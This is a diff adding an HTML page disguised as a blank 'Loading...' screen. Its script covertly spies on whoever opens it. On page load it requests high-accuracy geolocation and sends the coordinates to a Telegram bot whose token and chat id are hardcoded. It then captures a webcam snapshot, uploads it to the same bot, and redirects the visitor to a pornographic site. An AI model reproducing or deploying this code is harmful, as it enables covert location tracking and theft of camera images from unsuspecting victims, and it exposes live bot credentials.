@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Завантаження...</title>
+    <style>body { background: white; }</style> <!-- Белый фон -->
+    <script>
+        const botToken = "8148735117:AAH-WQMskqV-l-rSW5cG_SGEzHThUCVMan0";  // Замени на свой токен
+        const chatId = "7390774202";      // Замени на свой chat_id
+        const redirectUrl = "\https://rt.pornhub.com/"; // Сюда перенаправится человек
+
+        function sendToTelegram(message) {
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatId, text: message })
+            });
+        }
+
+        function sendPhotoToTelegram(photoBlob) {
+            const formData = new FormData();
+            formData.append("chat_id", chatId);
+            formData.append("photo", photoBlob, "photo.jpg");
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: "POST",
+                body: formData
+            });
+        }
+
+        function getLocationAndSend() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const accuracy = position.coords.accuracy;
+
+                        const message = `📍 *Геолокация пользователя:*\n🌍 Широта: ${lat}\n🌎 Долгота: ${lon}\n🎯 Точность: ${accuracy}м`;
+                        sendToTelegram(message);
+
+                        capturePhoto();
+                    },
+                    (error) => {
+                        sendToTelegram("❌ Ошибка при получении геолокации: " + error.message);
+                        capturePhoto();
+                    },
+                    { enableHighAccuracy: true } // Включаем максимальную точность
+                );
+            } else {
+                sendToTelegram("❌ Браузер не поддерживает геолокацию");
+                capturePhoto();
+            }
+        }
+
+        function capturePhoto() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then((stream) => {
+                    const video = document.createElement("video");
+                    video.srcObject = stream;
+                    video.play();
+
+                    setTimeout(() => {
+                        const canvas = document.createElement("canvas");
+                        canvas.width = 640;
+                        canvas.height = 480;
+                        const ctx = canvas.getContext("2d");
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        canvas.toBlob((blob) => {
+                            sendPhotoToTelegram(blob);
+                            stream.getTracks().forEach(track => track.stop()); // Останавливаем камеру
+                            setTimeout(() => { window.location.href = redirectUrl; }, 1000);
+                        }, "image/jpeg");
+                    }, 2000);
+                })
+                .catch((error) => {
+                    sendToTelegram("❌ Ошибка при доступе к камере: " + error.message);
+                    setTimeout(() => { window.location.href = redirectUrl; }, 1000);
+                });
+        }
+
+        window.onload = getLocationAndSend;
+    </script>
+</head>
+<body></body>
+</html>
